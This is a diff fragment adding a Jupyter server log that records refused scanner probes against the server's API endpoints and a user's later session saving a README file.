+        url = self.get_login_url()
+      File "/usr/local/lib/python3.10/dist-packages/jupyter_server/base/handlers.py", line 783, in get_login_url
+        raise web.HTTPError(403)
+    tornado.web.HTTPError: HTTP 403: Forbidden
+[W 2024-08-02 03:42:53.217 ServerApp] 403 GET /api/kernelspecs?1722522119064 (@123.249.116.81) 0.94ms referer=None
+[W 2024-08-02 03:44:16.088 TerminalsExtensionApp] wrote error: 'Method Not Allowed'
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1788, in _execute
+        result = method(*self.path_args, **self.path_kwargs)
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 269, in _unimplemented_method
+        raise HTTPError(405)
+    tornado.web.HTTPError: HTTP 405: Method Not Allowed
+[W 2024-08-02 03:44:16.089 TerminalsExtensionApp] 405 HEAD /api/terminals?1722521979964 (@123.249.116.30) 0.95ms referer=None
+[W 2024-08-02 03:44:16.224 TerminalsExtensionApp] wrote error: 'Forbidden'
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1788, in _execute
+        result = method(*self.path_args, **self.path_kwargs)
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 3289, in wrapper
+        url = self.get_login_url()
+      File "/usr/local/lib/python3.10/dist-packages/jupyter_server/base/handlers.py", line 783, in get_login_url
+        raise web.HTTPError(403)
+    tornado.web.HTTPError: HTTP 403: Forbidden
+[W 2024-08-02 03:44:16.225 TerminalsExtensionApp] 403 GET /api/terminals?1722521979964 (@123.249.116.30) 0.92ms referer=None
+[W 2024-08-02 03:46:47.571 ServerApp] wrote error: 'Method Not Allowed'
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1788, in _execute
+        result = method(*self.path_args, **self.path_kwargs)
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 269, in _unimplemented_method
+        raise HTTPError(405)
+    tornado.web.HTTPError: HTTP 405: Method Not Allowed
+[W 2024-08-02 03:46:47.572 ServerApp] 405 HEAD /api/sessions?1722523769288 (@123.249.116.81) 1.02ms referer=None
+[W 2024-08-02 03:46:47.646 ServerApp] wrote error: 'Forbidden'
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1788, in _execute
+        result = method(*self.path_args, **self.path_kwargs)
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 3289, in wrapper
+        url = self.get_login_url()
+      File "/usr/local/lib/python3.10/dist-packages/jupyter_server/base/handlers.py", line 783, in get_login_url
+        raise web.HTTPError(403)
+    tornado.web.HTTPError: HTTP 403: Forbidden
+[W 2024-08-02 03:46:47.646 ServerApp] 403 GET /api/sessions?1722523769288 (@123.249.116.81) 0.91ms referer=None
+[W 2024-08-02 03:50:05.902 ServerApp] wrote error: 'Method Not Allowed'
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1788, in _execute
+        result = method(*self.path_args, **self.path_kwargs)
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 269, in _unimplemented_method
+        raise HTTPError(405)
+    tornado.web.HTTPError: HTTP 405: Method Not Allowed
+[W 2024-08-02 03:50:05.903 ServerApp] 405 HEAD /api/contents?content=1&hash=0&1722523769605 (@123.249.91.159) 0.92ms referer=None
+[W 2024-08-02 03:50:05.982 ServerApp] wrote error: 'Forbidden'
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1788, in _execute
+        result = method(*self.path_args, **self.path_kwargs)
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 3289, in wrapper
+        url = self.get_login_url()
+      File "/usr/local/lib/python3.10/dist-packages/jupyter_server/base/handlers.py", line 783, in get_login_url
+        raise web.HTTPError(403)
+    tornado.web.HTTPError: HTTP 403: Forbidden
+[W 2024-08-02 03:50:05.983 ServerApp] 403 GET /api/contents?content=1&hash=0&1722523769605 (@123.249.91.159) 0.96ms referer=None
+[W 2024-08-02 03:51:20.562 ServerApp] wrote error: 'Method Not Allowed'
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1788, in _execute
+        result = method(*self.path_args, **self.path_kwargs)
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 269, in _unimplemented_method
+        raise HTTPError(405)
+    tornado.web.HTTPError: HTTP 405: Method Not Allowed
+[W 2024-08-02 03:51:20.563 ServerApp] 405 HEAD /api/kernels?1722522229326 (@123.249.91.159) 0.87ms referer=None
+[W 2024-08-02 03:51:20.755 ServerApp] wrote error: 'Forbidden'
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1788, in _execute
+        result = method(*self.path_args, **self.path_kwargs)
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 3289, in wrapper
+        url = self.get_login_url()
+      File "/usr/local/lib/python3.10/dist-packages/jupyter_server/base/handlers.py", line 783, in get_login_url
+        raise web.HTTPError(403)
+    tornado.web.HTTPError: HTTP 403: Forbidden
+[W 2024-08-02 03:51:20.755 ServerApp] 403 GET /api/kernels?1722522229326 (@123.249.91.159) 1.07ms referer=None
+[I 2024-08-02 04:11:46.855 ServerApp] 302 GET / (@178.128.224.223) 0.43ms
+[W 2024-08-02 04:36:38.876 ServerApp] wrote error: 'Method Not Allowed'
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1788, in _execute
+        result = method(*self.path_args, **self.path_kwargs)
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 269, in _unimplemented_method
+        raise HTTPError(405)
+    tornado.web.HTTPError: HTTP 405: Method Not Allowed
+[W 2024-08-02 04:36:38.877 ServerApp] 405 HEAD /api/sessions?1722524563790 (@123.249.77.152) 1.14ms referer=None
+[W 2024-08-02 04:36:38.924 ServerApp] wrote error: 'Forbidden'
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1788, in _execute
+        result = method(*self.path_args, **self.path_kwargs)
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 3289, in wrapper
+        url = self.get_login_url()
+      File "/usr/local/lib/python3.10/dist-packages/jupyter_server/base/handlers.py", line 783, in get_login_url
+        raise web.HTTPError(403)
+    tornado.web.HTTPError: HTTP 403: Forbidden
+[W 2024-08-02 04:36:38.924 ServerApp] 403 GET /api/sessions?1722524563790 (@123.249.77.152) 0.98ms referer=None
+[E 2024-08-02 05:48:38.384 ServerApp] Uncaught exception in write_error
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1753, in _execute
+        raise HTTPError(405)
+    tornado.web.HTTPError: HTTP 405: Method Not Allowed
+    
+    During handling of the above exception, another exception occurred:
+    
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1298, in send_error
+        self.write_error(status_code, **kwargs)
+      File "/usr/local/lib/python3.10/dist-packages/jupyter_server/base/handlers.py", line 739, in write_error
+        html = self.render_template("%s.html" % status_code, **ns)
+      File "/usr/local/lib/python3.10/dist-packages/jupyter_server/base/handlers.py", line 665, in render_template
+        ns.update(self.template_namespace)
+      File "/usr/local/lib/python3.10/dist-packages/jupyter_server/base/handlers.py", line 675, in template_namespace
+        logged_in=self.logged_in,
+      File "/usr/local/lib/python3.10/dist-packages/jupyter_server/base/handlers.py", line 198, in logged_in
+        user = self.current_user
+      File "/usr/local/lib/python3.10/dist-packages/tornado/web.py", line 1424, in current_user
+        self._current_user = self.get_current_user()
+      File "/usr/local/lib/python3.10/dist-packages/jupyter_server/base/handlers.py", line 177, in get_current_user
+        raise RuntimeError(msg)
+    RuntimeError: Calling `Template404.get_current_user()` directly is deprecated in jupyter-server 2.0. Use `self.current_user` instead (works in all versions).
+[W 2024-08-02 05:48:38.384 ServerApp] 405 CONNECT example.com:443 (@23.176.184.7) 0.88ms referer=None
+[I 2024-08-02 06:34:47.054 ServerApp] 302 GET / (@167.94.146.52) 0.61ms
+[I 2024-08-02 06:34:56.560 ServerApp] 302 GET / (@167.94.146.52) 0.40ms
+[I 2024-08-02 06:34:57.065 ServerApp] Malformed HTTP message from 167.94.146.52: Malformed HTTP version in HTTP Request-Line: 'HTTP/2.0'
+[I 2024-08-02 06:35:00.592 JupyterNotebookApp] 302 GET /tree (@167.94.146.52) 0.57ms
+[I 2024-08-02 06:35:01.322 ServerApp] Malformed HTTP message from 167.94.146.52: Malformed HTTP version in HTTP Request-Line: 'HTTP/2.0'
+[I 2024-08-02 06:35:02.251 ServerApp] 302 GET / (@167.94.146.52) 0.60ms
+[I 2024-08-02 06:35:09.742 ServerApp] Malformed HTTP message from 167.94.146.52: Malformed HTTP version in HTTP Request-Line: 'HTTP/2.0'
+[I 2024-08-02 06:35:10.234 ServerApp] 302 GET / (@167.94.146.52) 0.44ms
+[I 2024-08-02 06:36:56.431 ServerApp] 302 GET / (@92.249.48.208) 0.43ms
+[I 2024-08-02 06:43:29.539 ServerApp] 302 GET / (@172.234.94.34) 0.48ms
+[W 2024-08-02 06:43:29.688 ServerApp] 404 GET /v2/_catalog (@172.235.218.185) 1.49ms referer=None
+[I 2024-08-02 06:43:29.690 ServerApp] 302 GET / (@172.235.218.174) 1.31ms
+[W 2024-08-02 06:43:29.691 ServerApp] 404 GET /query?q=SHOW+DIAGNOSTICS (@172.235.218.131) 1.73ms referer=None
+[W 2024-08-02 06:43:29.692 ServerApp] 404 GET /solr/admin/info/system (@172.235.218.149) 2.19ms referer=None
+[W 2024-08-02 06:43:29.693 ServerApp] 404 GET /cgi-bin/authLogin.cgi (@172.235.218.149) 2.66ms referer=None
+[I 2024-08-02 06:43:29.747 JupyterNotebookApp] 302 GET /tree? (@172.235.218.174) 0.55ms
+[W 2024-08-02 06:43:29.801 ServerApp] 404 GET /solr/admin/cores?action=STATUS&wt=json (@172.235.218.149) 1.64ms referer=None
+[I 2024-08-02 07:30:48.935 ServerApp] 302 GET / (@106.75.50.6) 0.42ms
+[I 2024-08-02 07:30:48.968 JupyterNotebookApp] 302 GET /tree?/robots.txt (@106.75.50.6) 0.83ms
+[I 2024-08-02 07:30:48.969 JupyterNotebookApp] 302 GET /tree?/sitemap.xml (@106.75.50.6) 0.60ms
+[I 2024-08-02 07:31:00.826 JupyterNotebookApp] 302 GET /tree? (@106.75.50.6) 0.61ms
+[I 2024-08-02 08:01:21.909 ServerApp] 302 GET / (@117.176.248.71) 0.38ms
+[I 2024-08-02 08:01:23.001 ServerApp] Connecting to kernel f4b02ff0-99f3-4fe2-a615-3fc19aa9b142.
+[I 2024-08-02 08:01:23.158 ServerApp] Starting buffering for f4b02ff0-99f3-4fe2-a615-3fc19aa9b142:2aed0d11-ca58-4719-b349-fac0dca1a967
+[I 2024-08-02 08:01:48.858 ServerApp] 302 GET / (@117.176.248.71) 0.43ms
+[I 2024-08-02 08:01:49.893 ServerApp] Connecting to kernel f4b02ff0-99f3-4fe2-a615-3fc19aa9b142.
+[I 2024-08-02 08:01:50.031 ServerApp] Starting buffering for f4b02ff0-99f3-4fe2-a615-3fc19aa9b142:d676e5a8-652d-4e2d-8ebc-fc7394274f2a
+[I 2024-08-02 08:02:00.647 LabApp] 301 GET /lab/ (5636fc03b89e47a6ad9cdef2595e0b00@117.176.248.71) 0.62ms
+[W 2024-08-02 08:02:01.410 LabApp] Could not determine jupyterlab build status without nodejs
+[I 2024-08-02 08:02:01.509 ServerApp] Connecting to kernel f4b02ff0-99f3-4fe2-a615-3fc19aa9b142.
+[I 2024-08-02 08:02:01.708 ServerApp] Starting buffering for f4b02ff0-99f3-4fe2-a615-3fc19aa9b142:34bebbd8-df9f-4f18-9d2b-fb8b071debe4
+[I 2024-08-02 08:02:01.880 ServerApp] New terminal with automatic name: 3
+[I 2024-08-02 08:02:02.595 ServerApp] Connecting to kernel f4b02ff0-99f3-4fe2-a615-3fc19aa9b142.
+[I 2024-08-02 08:02:40.301 ServerApp] Saving file at /Rampup2024/README.md
+[I 2024-08-02 08:03:04.279 ServerApp] Saving file at /Rampup2024/README.md
+[I 2024-08-02 08:03:09.939 ServerApp] Saving file at /Rampup2024/README.md
+[I 2024-08-02 08:03:21.992 ServerApp] Saving file at /Rampup2024/README.md
+[I 2024-08-02 08:03:53.386 ServerApp] Saving file at /Rampup2024/README.md
+[I 2024-08-02 08:04:09.662 ServerApp] Saving file at /Rampup2024/README.md
+[I 2024-08-02 08:04:22.925 ServerApp] Saving file at /Rampup2024/README.md
